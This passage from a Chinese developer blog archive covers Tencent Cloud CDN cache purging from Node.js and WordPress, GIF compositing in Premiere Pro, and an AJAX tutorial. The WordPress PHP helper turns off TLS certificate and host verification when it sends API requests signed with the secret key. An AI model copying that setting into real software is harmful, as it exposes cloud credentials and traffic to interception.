var secretKey = process.env.TENCENT_API_SECRETKEY;

// 实例化一个认证对象，入参需要传入腾讯云账户 SecretId 和 SecretKey，此处还需注意密钥对的保密
// 代码泄露可能会导致 SecretId 和 SecretKey 泄露，并威胁账号下所有资源的安全性。以下代码示例仅供参考，建议采用更安全的方式来使用密钥，请参见：https://cloud.tencent.com/document/product/1278/85305
// 密钥可前往官网控制台 https://console.cloud.tencent.com/cam/capi 进行获取
const clientConfig = {
  credential: {
    secretId: secretId,
    secretKey: secretKey,
  },
  region: &quot;&quot;,
  profile: {
    httpProfile: {
      endpoint: &quot;cdn.tencentcloudapi.com&quot;,
    },
  },
};

// 实例化要请求产品的client对象,clientProfile是可选的
const client = new CdnClient(clientConfig);
const params = {
    &quot;Paths&quot;: [
      /* 替换成你的网址 */
        &quot;https://uuanqin.top&quot;,
        &quot;https://www.uuanqin.top&quot;
    ],
    &quot;FlushType&quot;: &quot;delete&quot;
};
client.PurgePathCache(params).then(
  (data) =&gt; {
    console.log(data);
  },
  (err) =&gt; {
    console.error(&quot;error&quot;, err);
  }
);
</code></pre>
<h1>方案三：WordPress 解决方案</h1>
<p>在 <code>functions.php</code> 下添加自动刷新腾讯云控制台 CDN 缓存的操作。</p>
<pre><code class="language-php">/* 需要填写你的密钥，访问 https://console.qcloud.com/capi 获取 SecretId 及 $secretKey */
$secretKey = '填写你的密钥';
$secretId = '填写你的密钥';

//更新或发布文章清理本文和首页CDN缓存
add_action('publish_post', 'Clean_By_Publish', 0);

//提交评论更新本文CDN缓存
add_action('comment_post', 'Clean_By_Comments',0);

//评论被审核更新本文CDN缓存
add_action('comment_unapproved_to_approved', 'Clean_By_Approved',0);

//发布文章更新CDN缓存函数
function Clean_By_Publish($post_ID){
global $secretKey,$secretId;
$url = get_permalink($post_ID);
$action='RefreshCdnUrl';
/*要清理的页面，默认包含首页和文章页面，需要清理其他页面请自行发挥*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; home_url(),
'urls.1' =&gt; $url ,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}

//提交评论清理文章CDN函数
function Clean_By_Comments($comment_id)
{
global $secretKey,$secretId;
$comment = get_comment($comment_id);
$url = get_permalink($comment-&gt;comment_post_ID);
$action='RefreshCdnUrl';
/*参数*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; $url,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}

//评论被审核清理CDN缓存函数
function Clean_By_Approved($comment)
{
global $secretKey,$secretId;
$url = get_permalink($comment-&gt;comment_post_ID);
$action='RefreshCdnUrl';
/*参数*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; $url,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}

//请求主函数，无需改动
function CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps)
{
$FullHttpUrl = $HttpUrl.&quot;/v2/index.php&quot;;
/***************对请求参数 按参数名 做字典序升序排列，注意此排序区分大小写*************/
$ReqParaArray = array_merge($COMMON_PARAMS, $PRIVATE_PARAMS);
ksort($ReqParaArray);
/**********************************生成签名原文**********************************
* 将 请求方法, URI地址,及排序好的请求参数 按照下面格式 拼接在一起, 生成签名原文，此请求中的原文为
* GETcvm.api.qcloud.com/v2/index.php?Action=DescribeInstances&amp;Nonce=345122&amp;Region=gz
* &amp;SecretId=AKIDz8krbsJ5yKBZQ ·1pn74WFkmLPx3gnPhESA&amp;Timestamp=1408704141
* &amp;instanceIds.0=qcvm12345&amp;instanceIds.1=qcvm56789
* ****************************************************************************/
$SigTxt = $HttpMethod.$FullHttpUrl.&quot;?&quot;;
$isFirst = true;
foreach ($ReqParaArray as $key =&gt; $value)
{
if (!$isFirst)
{
$SigTxt = $SigTxt.&quot;&amp;&quot;;
}
$isFirst= false;
/*拼接签名原文时，如果参数名称中携带_，需要替换成.*/
if(strpos($key, '_'))
{
$key = str_replace('_', '.', $key);
}
$SigTxt=$SigTxt.$key.&quot;=&quot;.$value;
}
/*********************根据签名原文字符串 $SigTxt，生成签名 Signature******************/
$Signature = base64_encode(hash_hmac('sha1', $SigTxt, $secretKey, true));
/***************拼接请求串,对于请求参数及签名，需要进行urlencode编码********************/
$Req = &quot;Signature=&quot;.urlencode($Signature);
foreach ($ReqParaArray as $key =&gt; $value)
{
$Req=$Req.&quot;&amp;&quot;.$key.&quot;=&quot;.urlencode($value);
}
/*********************************发送请求********************************/
if($HttpMethod === 'GET')
{
if($isHttps === true)
{
$Req=&quot;https://&quot;.$FullHttpUrl.&quot;?&quot;.$Req;
}
else
{
$Req=&quot;http://&quot;.$FullHttpUrl.&quot;?&quot;.$Req;
}
$Rsp = file_get_contents($Req);
}
else
{
if($isHttps === true)
{
$Rsp= SendPost(&quot;https://&quot;.$FullHttpUrl,$Req,$isHttps);
}
else
{
$Rsp= SendPost(&quot;http://&quot;.$FullHttpUrl,$Req,$isHttps);
}
}
//var_export(json_decode($Rsp,true));
return json_decode($Rsp,true);
}
function SendPost($FullHttpUrl, $Req, $isHttps)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $Req);
curl_setopt($ch, CURLOPT_URL, $FullHttpUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 1 );
if ($isHttps === true) {
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
}
$result = curl_exec($ch);
return $result;
}
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://cloud.tencent.com/document/product/1278/46697">云 API 使用 API Explorer-快速入门-文档中心-腾讯云 (tencent.com)</a></li>
<li><a href="https://cloud.tencent.com/document/sdk/Node.js">Node.js-SDK 中心-腾讯云 (tencent.com)</a></li>
<li><a href="https://blog.csdn.net/qq_41684621/article/details/111463672">npm 安装包的路径在哪里<em>npm install 在哪里输入</em>兮动人的博客-CSDN 博客</a></li>
<li><a href="https://blog.csdn.net/sunnyjingqi/article/details/107000607">npm 之安装、更新、卸载本地安装包_samllplum 的博客-CSDN 博客</a></li>
<li><a href="https://www.ly522.com/1506.html">wordpress 腾讯 CDN 缓存实现发布/更新文章/评论自动刷新-轻刻年轮 (ly522.com)</a></li>
<li><a href="https://docs.npmjs.com/cli/v6/using-npm/scripts#special-packagejson-config-object">scripts | npm Docs (npmjs.com)</a></li>
<li><a href="http://ruanyifeng.com/blog/2016/10/npm_scripts.html">npm scripts 使用指南 - 阮一峰的网络日志 (ruanyifeng.com)</a></li>
<li><a href="https://cloud.tencent.com/document/product/1278/85305">云 API 云 API 密钥安全方案推荐-开发指南-文档中心-腾讯云 (tencent.com)</a></li>
<li><a href="https://blog.csdn.net/xishining/article/details/119283522">操作系统：Linux 环境变量配置的 6 种方法_export path 后 需要执行什么-CSDN博客</a></li>
<li><a href="https://mwell.tech/archives/11408">Python 中的环境变量 – 读取、打印、设置 – 码微 (mwell.tech)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="4139834099">
                            <a href="#4139834099">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 侧边栏实现 Obsidian 关系图谱</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>使用钩子在 Hexo 部署前检查 Obsidian 是否启动：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li>Hexo 发布后自动刷新 CDN：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的工作流：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a>、<a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3118126311">
                            <a href="#3118126311">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>任何时候使用任何 API 时都要注意保护好密钥。详见：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2052246699" class="record">
            <header>
                <h1 class="record-title">使用 Adobe Premiere Pro 实现 GIF 动图画面拼接</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Adobe Premiere Pro');">Adobe Premiere Pro</button>
                    
                    <button class="btn" onclick="activeTag('GIF');">GIF</button>
                    
                    <button class="btn" onclick="activeTag('WPS');">WPS</button>
                    
                    <button class="btn" onclick="activeTag('PPT');">PPT</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/gifpngcover.jpg</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>文章介绍通过素材进行画面拼接和合并的技巧和方法</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7a52ccab</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>想自己组合一个 GIF，本来以为这种简单的东西交给在线网站做就行了，不必用到 PR 来做，不然有点大材小用的感觉。但是在互联网找一圈后，能成功达到我的要求的根本没有，主要槽点在于：</p>
<ul>
<li>没有符合我需求的 GIF 处理。我要的是<strong>画面上的拼接</strong>，不是 <strong>GIF 前后合并</strong></li>
<li>不能直击痛点。WPS 图像处理也有 GIF 编辑，但是功能少和简陋。一些网站提供图像拼接，但是只能在规定的框架格式下运行（还要关注公众号）</li>
<li>不能逐帧操作。WPS 图像处理可以逐帧操作，但简陋，不好调整图片<br>
额......突然发现我的需求还是挺复杂的。那么，刁钻的要求往往需要专业的软件解决，于是我就打算使用 PR 完成这个需求。<br>
其实到最后，PR 也没能一键解决最后的需求。</li>
</ul>
<h1>需求描述</h1>
<p>我拥有 GIF 图一张，PNG 素材两张（两个气泡框），我需要把他们整合到同一个画面生成 GIF，并且最后生成的 GIF 不同的帧显示我指定的 PNG。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501182132872.png" alt="image-20230501182132872"></p>
<h1>打开 PR</h1>
<h2>素材导入</h2>
<p>两个气泡框的素材制作完成后，把所需要的文件导进来：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501182627900.png" alt="image-20230501182627900"></p>
<p>调整好时间轴，刀片切割和拼接这些“视频条”（不懂专业名词）就不用我多说了吧：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501182750698.png" alt="image-20230501182750698"></p>
<h2>扩展画布</h2>
<p>时间轴上选中 GIF 后，打开序列设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501182849883.png" alt="image-20230501182849883"></p>
<p>调整画布大小：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501183003235.png" alt="image-20230501183003235"></p>
<h2>素材移动</h2>
<p>为每一个片段添加“变换”效果（双击）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501183134619.png" alt="image-20230501183134619"></p>
<p>在效果控件里调整位置、大小等参数：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501183306716.png" alt="image-20230501183306716"></p>
<h2>导出</h2>
<p>在老版本的 PR 里，GIF 的导出不支持把 Alpha 通道导出，也就是导出的 GIF 是黑色背景的。你可以看这篇文章确定一下你的 PR 是否可以直接导出透明背景的的 GIF：<a href="https://zhuanlan.zhihu.com/p/546279499">Premiere 2022 直接导出带透明通道 GIF 动画 - 知乎 (zhihu.com)</a>，注意，导出格式选择<strong>动画 GIF</strong>，不是<strong>GIF</strong>！</p>
<p>如果你成功导出透明背景的 GIF 了，那么这篇文章就结束了！</p>
<p>如果上面这篇文章不能解决问题，那么你可以试着导出 PNG 序列：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501183800474.png" alt="image-20230501183800474"></p>
<h1>PNG 序列生成 GIF</h1>
<p>你可以用任何工具把 PNG 序列生成 GIF，如 PS 等。</p>
<h2>WPS 图片处理（不推荐）</h2>
<p>WPS 图片处理：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501183952279.png" alt="image-20230501183952279"></p>
<p>添加 PNG 文件后调整速度，选择导出即可。</p>
<p>问题是它<strong>把透明底变白底</strong>了！（辣鸡，会员 🐶 都不充）</p>
<h2>第三方网站处理</h2>
<p>这里我使用了在线网站进行处理：<a href="https://ezgif.com/maker">ezgif.com</a></p>
<p>参数参考下图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711162645.png" alt="image.png"></p>
<h1>成果展示</h1>
<p>白天模式：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711162816.png" alt="image.png"></p>
<p>夜间模式：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711162832.png" alt="image.png"></p>
<p>大功告成！</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://jingyan.baidu.com/article/4853e1e5387e2b5809f726b6.html">pr2020 如何调整画布大小-百度经验 (baidu.com)</a></li>
<li><a href="https://jingyan.baidu.com/article/d5c4b52bb1c48eda570dc542.html">在 PR 中怎么将两个视频内容拼接到一起显示-百度经验 (baidu.com)</a></li>
<li><a href="https://jingyan.baidu.com/article/f3ad7d0f5d39bb09c3345bf1.html">Pr 怎么导出 gif 动图-百度经验 (baidu.com)</a></li>
<li><a href="https://jingyan.baidu.com/article/f0e83a25bcbda463e59101ae.html">Premiere 怎样导出带有透明背景的 GIF 动画-百度经验 (baidu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/546279499">Premiere 2022 直接导出带透明通道 GIF 动画 - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2676514221" class="record">
            <header>
                <h1 class="record-title">代码驱动学习-快速入门 AJAX</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('AJAX');">AJAX</button>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
                    <button class="btn" onclick="activeTag('VSCode');">VSCode</button>
                    
                    <button class="btn" onclick="activeTag('源码案例驱动');">源码案例驱动</button>
                    
                    <button class="btn" onclick="activeTag('axios');">axios</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/2/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/ajaxcover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通读代码快速理解 AJAX 原理</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>9f885dad</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] ❄❄❄白雪警告❄❄❄<br>
原生的 AJAX 请求方式目前已经很少使用，一般使用 axios。本文包含部分 axios 内容。</p>
</blockquote>
<blockquote>
<p>源码附于文末。</p>
</blockquote>
<h1>什么是 AJAX？</h1>
<p>AJAX（Asynchronous JavaScript And XML，异步的 JavaScript 和 XML），读作”/eɪdʒæks/，也可以念为“阿贾克斯”。最大的特点就是<strong>在不刷新网页的情况下向服务端发请求并获取结果</strong>。AJAX 不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式。</p>
<blockquote>
<p>Ajax 是一个令人误导的名称。Ajax 应用程序可能使用 XML 来传输数据，但将数据作为纯文本或 JSON 文本传输也同样常见。参考：<a href="https://www.w3school.com.cn/js/js_ajax_intro.asp">AJAX 简介 (w3school.com.cn)</a></p>
</blockquote>
<blockquote>
<p>XML 可扩展标记语言，XML 被设计用来传输和存储数据。XML 和 HTML 类似，不同的是 HTML 中都是预定义标签，而 XML 中没有预定义标签，全都是自定义标签，用来表示一些数据。不过现在 AJAX 多使用 JSON 格式了。</p>
<p>XML 简介：<a href="https://www.w3school.com.cn/x.asp">XML系列教程 (w3school.com.cn)</a></p>
</blockquote>
<p>AJAX 的优点：</p>
<ul>
<li>可以无需刷新页面而与服务器端进行通信。</li>
<li>允许你根据用户事件来更新部分页面内容。</li>
</ul>
<p>AJAX 的缺点：</p>
<ul>
<li>没有浏览历史，不能回退</li>
<li>存在跨域问题 (同源)</li>
<li>SEO 不友好</li>
</ul>
<p>应用：</p>
<ol>
<li>搜索联想</li>
<li>用户名是否可用</li>
</ol>
<p>同步操作和异步操作的区别：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240502182625.webp" alt="image.png"></p>
<h1>学习准备</h1>
<h2>预备知识</h2>
<p>本文章在于通过代码实践快速掌握 AJAX 基本使用。阅读前你需要具备一定的 HTML、CSS、JS 知识，了解 HTTP 协议的请求报文和响应报文的结构。</p>
<ul>
<li>JS 基础请看：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/JavaScript_basics">JavaScript 基础 - 学习 Web 开发 | MDN (mozilla.org)</a></li>
<li>HTTP 结构：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages">HTTP 消息 - HTTP | MDN (mozilla.org)</a></li>
</ul>
<p>学习前我们需要懂得使用 Chrome、Edge 浏览器开发者模式（按 F12），查看查看 HTTP 报文接收和发送情况。</p>
<p>本文章主要通过可运行的案例代码以驱动学习，学习者可以通过理解代码并试图在本机运行以加深理解。建议你在学习时打开 F12 调试窗口，查看控制台输出与网络请求。</p>
<p>本篇文章的实践内容参考：<a href="https://www.bilibili.com/video/BV1WC4y1b78y%EF%BC%8C%E8%A7%86%E9%A2%91%E6%97%B6%E9%95%BF%E7%BA%A6">https://www.bilibili.com/video/BV1WC4y1b78y，视频时长约</a> 3 小时。</p>
<h2>软件安装</h2>
<h3>Node.js</h3>
<p>安装 Node.js：<a href="https://nodejs.org/en">Node.js (nodejs.org)</a>。</p>
<p>安装完毕后在终端输入命令：</p>
<pre><code class="language-sh">node -v
</code></pre>
<p>若显示版本号即安装成功。</p>
<h3>Express 服务端框架</h3>
<p>为了更好的演示 AJAX 操作，我们需要自己启动一个服务端。接下来的实验我们只需要对这个服务端进行消息的发送。在这一小节中，我们只需要了解 Express 的最小知识。</p>
<p>安装前保证安装了 Node.js，输入：</p>
<pre><code class="language-sh">npm i express
</code></pre>
<p>npm 是 Node.js 提供的包管理工具。通过该命令安装 express。</p>
<p>新建 js 文件，可以将其命名为 server.js，内容如下：</p>
<pre><code class="language-js">// 1. 引入express
const express = require('express');

// 2. 创建应用对象
const app = express();

// 3. 创建路由规则
// request是对请求报文的封装，response是对响应报文的封装
app.get('/server',(request,response)=&gt;{
    response.setHeader('Access-Control-Allow-Origin',&quot;*&quot;);

    //设置一个简单的响应
    response.send('HELLO AJAX!')
})

// 4. 监听端口启动服务
app.listen(8000,()=&gt;{
    console.log(&quot;服务已经启动，8000端口监听中...&quot;)
})
</code></pre>
<p>打开终端，执行以下命令启动服务：</p>
<pre><code>node &lt;your server.js&gt; 
</code></pre>
<p>终端输出 &quot; 服务已经启动，8000 端口监听中...&quot;。打开浏览器输入 127.0.0.1:8000，若显示 '‘'HELLO AJAX!'，则服务启动成功。</p>
<p>注意，每次修改 server.js 文件，<strong>保存后</strong>需要关闭当前正在运行的服务，再次启动 server.js 才能应用新的更改。如果我们想要每次修改 server.js 保存后自动重启服务器，我们可以安装 modemon 进行解决。</p>
<p>常见错误：</p>
<ul>
<li>
<p><strong>启动失败 address already in use :::8000</strong></p>
<p>这表明 8000 端口已经被占用，你可能忘记中断之前打开的服务，尝试中断之前的服务，或换一个端口号尝试。</p>
</li>
<li>
<p><strong>输入命令后没有反应</strong></p>
<p>检查你是不是粘贴后没有保存。</p>
</li>
</ul>
<h3>nodemon 工具安装</h3>
<p>官网链接：<a href="https://www.npmjs.com/package/nodemon">nodemon - npm (npmjs.com)</a></p>
<p>安装前保证安装好了 Node.js。安装命令：</p>
<pre><code class="language-sh">npm install -g nodemon
</code></pre>
<p>以后每次启动 server.js 脚本可以改为使用以下命令：</p>
<pre><code class="language-sh">nodemon &lt;your server.js&gt;
</code></pre>
<h3>axios</h3>
<p>axio 是前端热门的 AJAX 工具库：<a href="https://www.axios-http.cn/">Axios中文文档 | Axios中文网 (axios-http.cn)</a></p>
<p>使用 axio 我们可以直接通过页面链接引用。</p>
<p>但是官网给的 CDN 链接是在国外的，所以我们可以通过 <a href="https://www.bootcdn.cn/">BootCDN</a> 查询并替换网址。</p>
<pre><code>https://cdn.bootcdn.net/ajax/libs/axios/1.3.6/axios.min.js
</code></pre>
<h3>【非必须】VSCode 插件 -Live Server</h3>
<p>如果你是在 VSCode 环境下进行操作的话，可以安装一个 Live Server 插件。这个插件右键可以将 html 网页用服务器打开，以模拟跨域同源实验。</p>
<h1>第一章节：AJAX 请求基本实践</h1>
<p>本章节包含两个文件：</p>
<pre><code>server.js 服务器文件
client.html 案例
</code></pre>
<p>案例食用说明：</p>
<ol>
<li>在终端输入命令执行 server.js <code>nodemon &lt;your server.js&gt;</code></li>
<li>浏览器打开 client.html</li>
</ol>
<p>阅读源码和注解理解即可。</p>
<p>要点提示：</p>
<ul>
<li>
<p>Chapter 1：本章节演示了 AJAX 操作的基本步骤</p>
</li>
<li>
<p>Chapter 2：演示使用 GET 方法传参与请求头设置</p>
<p>打开 F12 查看请求标头，可以发现自定义标头已添加。</p>
</li>
</ul>
<p>​	<img src="https://cdn.gallery.uuanqin.top/img/image-20230426170053196.png" alt="image-20230426170053196"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230426170810095.png" alt="image-20230426170810095"></p>
<p>小技巧：解决 IE 缓存问题。神奇的 IE 浏览器会对 AJAX 进行缓存，解决方法：在请求地址后加上随机的参数，比如：</p>
<pre><code class="language-js">xhr.open(&quot;GET&quot;,&quot;http://127.0.0.1:8000/server?t=&quot;+Date.now())
</code></pre>
<p>或者在调试器中禁用缓存。</p>
<ul>
<li>
<p>Chapter 3：演示 AJAX 发送 POST 请求</p>
</li>
<li>
<p>Chapter 4：演示 AJAX 超时设置以及设置网络异常时的回调</p>
<p>调试器可以方便地断开网络：</p>
</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230426183213807.png" alt="image-20230426183213807"></p>
<ul>
<li>Chapter 5：防抖的演示。防抖在于防止用户反复点击按钮发送多个请求，这里的代码可以实现用户每次只能发送一个请求。</li>
<li>Chapter 6：axios 演示</li>
<li>Chapter 7：fetch 演示</li>
</ul>
<h1>第二章节：跨域/同源</h1>
<p>同源策略 (Same-Origin Policy) 最早由 Netscape 公司提出，是浏览器的一种安全策略，也就是当前网页 URL 和 AJAX 请求的目标 URL 必须<strong>同源</strong>（协议、域名、端口号必须完全相同）。AJAX 发送请求时默认遵循同源策略。违背同源策略就是<strong>跨域</strong>。</p>
<p>跨域的解决方案有以下两种：</p>
<ul>
<li>
<p>Jsonp：JSONP（JSON with Padding)，是一个非官方的跨域解决方案，只支持 get 请求。</p>
<p>JSONp 怎么工作的？在网页有一些标签天生具有跨域能力，比如：img、link iframe、script。JSONP 就是利用 script 标签的跨域能力来发送请求的。</p>
</li>
<li>
<p>CORS：CORS（Cross-Origin Resource Sharing），跨域资源共享。CORS 是官方的跨域解决方案，它的特点是不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持 get 和 post 请求。跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。CORS 怎么工作的？CORS 是通过设置一个响应头来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行。</p>
</li>
</ul>
<p>本章节包含两个文件：</p>
<pre><code>server.js 服务器文件（就是上一章节那个）
same-origin-policy.html 案例
handle.js 示例js文件（需保证与server.js放在同一层级下）
</code></pre>
<p>案例食用说明：</p>
<ol>
<li>在终端输入命令执行 server.js <code>nodemon &lt;your server.js&gt;</code></li>
<li>使用不同的端口或协议打开 same-origin-policy.html</li>
</ol>
<p>阅读源码和注解理解即可。</p>
<p>要点提示：</p>
<ul>
<li>Chapter 1：同源策略示例</li>
<li>Chapter 2：Jsonp 简单示例</li>
<li>Chapter 3：原生使用 Jsonp</li>
<li>Chapter 4：服务端设置 CROS 响应头实现跨域</li>
</ul>
<h1>文章代码</h1>
<p>链接：<a href="https://pan.baidu.com/s/1AsxAiua98_pyHzno7HCSFA?pwd=33gn">https://pan.baidu.com/s/1AsxAiua98_pyHzno7HCSFA?pwd=33gn</a></p>
<p>提取码：33gn</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=35&amp;spm_id_from=pageDriver&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">Day03-02. Ajax-Axios2_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2737438580" class="record">
            <header>
                <h1 class="record-title">极简图书管理系统，快速上手Flask-Vue前后端开发</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('Flask');">Flask</button>
                    
                    <button class="btn" onclick="activeTag('Vite');">Vite</button>
                    
                    <button class="btn" onclick="activeTag('Vue');">Vue</button>
                    
                    <button class="btn" onclick="activeTag('ElementPlus');">ElementPlus</button>
                    
                    <button class="btn" onclick="activeTag('MySQL');">MySQL</button>
                    
                    <button class="btn" onclick="activeTag('源码案例驱动');">源码案例驱动</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/4/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/tushuguanlixitongcover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>源码项目学习实践，快速掌握Flask+Vue的前后端开发流程</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>a329ff74</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
